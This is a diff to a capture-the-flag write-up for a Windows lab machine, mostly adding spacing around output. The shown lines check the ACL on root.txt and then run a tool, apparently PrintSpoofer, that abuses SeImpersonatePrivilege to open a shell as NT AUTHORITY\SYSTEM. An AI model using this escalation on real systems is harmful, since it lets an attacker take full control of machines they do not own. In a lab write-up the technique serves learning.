@@ -214,11 +214,17 @@ powershell -c "Get-Acl 'C:\Users\Nekrotic\Desktop\root.txt' | Format-List"
 ```
 
 we get the output as 
+
 Path   : Microsoft.PowerShell.Core\FileSystem::C:\Users\Nekrotic\Desktop\root.txt
+
 Owner  : NT AUTHORITY\SYSTEM
+
 Group  : WIN-EOM4PK0578N\None
+
 Access : NT AUTHORITY\SYSTEM Allow  FullControl
+
 Audit  : 
+
 Sddl   : O:SYG:S-1-5-21-343416598-1122472384-1008025730-513D:PAI(A;;FA;;;SY)
 
 this means the root.txt file is entirely owned by the NT AUTHORITY\SYSTEM
@@ -250,13 +256,17 @@ and we try to get an interactive shell
 ps.exe -i -c cmd
 ```
 [+] Found privilege: SeImpersonatePrivilege
+
 [+] Named pipe listening...
+
 [+] CreateProcessAsUser() OK
+
 Microsoft Windows [Version 10.0.17763.737]
+
 (c) 2018 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32>whoami
-whoami
+
 nt authority\system
 
 boom! we have a shell as nt authority\system, lets read the root.txt and submit the root flag
